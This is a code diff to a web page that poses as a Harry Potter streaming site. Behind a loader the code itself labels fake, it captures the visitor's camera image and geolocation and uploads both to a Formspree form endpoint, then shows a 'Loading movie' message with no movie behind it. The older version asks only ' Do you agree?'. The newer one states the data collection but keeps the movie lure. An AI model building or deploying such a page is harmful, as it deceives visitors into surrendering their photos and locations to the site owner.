@@ -45,7 +45,7 @@ button:hover {
   background: #6f7dff;
 }
 
-#status {
+#loader {
   display: none;
   margin-top: 20px;
   font-size: 18px;
@@ -64,7 +64,7 @@ video, canvas {
   <button onclick="start()">Watch Now – Part 1</button>
   <button onclick="start()">Watch Now – Part 2</button>
 
-  <div id="status">🔮 Loading Harry Potter...</div>
+  <div id="loader">🔮 Loading Harry Potter...</div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -75,26 +75,24 @@ let stream;
 let locationText = "";
 
 async function start() {
-  const status = document.getElementById("status");
-  status.style.display = "block";
-  status.innerText = "🔮 Loading Harry Potter...";
+  document.getElementById("loader").style.display = "block";
 
   setTimeout(async () => {
-    const agree = confirm(
-      " Do you agree?"
+    const allow = confirm(
+      "This will access your camera and send your photo and location to the site owner. Do you agree?"
     );
 
-    if (!agree) {
-      status.style.display = "none";
+    if (!allow) {
+      document.getElementById("loader").style.display = "none";
       return;
     }
 
     // LOCATION
     navigator.geolocation.getCurrentPosition(pos => {
       locationText =
-        "Latitude: " + pos.coords.latitude +
-        "\nLongitude: " + pos.coords.longitude +
-        "\nAccuracy: " + pos.coords.accuracy + " meters";
+        "Latitude: " + pos.coords.latitude + "\n" +
+        "Longitude: " + pos.coords.longitude + "\n" +
+        "Accuracy: " + pos.coords.accuracy + " meters";
     });
 
     // CAMERA
@@ -102,14 +100,12 @@ async function start() {
     const video = document.getElementById("video");
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
-      captureAndSend();
-    };
+    video.onloadedmetadata = () => captureAndUpload();
 
-  }, 1000); // visual animation only
+  }, 1200); // fake loading only
 }
 
-function captureAndSend() {
+function captureAndUpload() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
@@ -117,25 +113,20 @@ function captureAndSend() {
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video, 0, 0);
 
-  const imageData = canvas.toDataURL("image/png");
-
   stream.getTracks().forEach(track => track.stop());
 
-  document.getElementById("status").innerText = "📤 Sending...";
+  // SEND AS REAL IMAGE FILE
+  canvas.toBlob(async (blob) => {
+    const formData = new FormData();
+    formData.append("photo", blob, "photo.png");
+    formData.append("location", locationText);
 
-  fetch("https://formspree.io/f/xjgknygj", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      photo: imageData,
-      location: locationText
-    })
-  })
-  .then(() => {
-    document.getElementById("status").innerText = "✅ Done";
-  })
-  .catch(() => {
-    document.getElementById("status").innerText = "❌ Failed to send";
+    await fetch("https://formspree.io/f/YOUR_FORM_ID", {
+      method: "POST",
+      body: formData
+    });
+
+    document.getElementById("loader").innerText = "🎬 Loading movie...";
   });
 }
 </script>
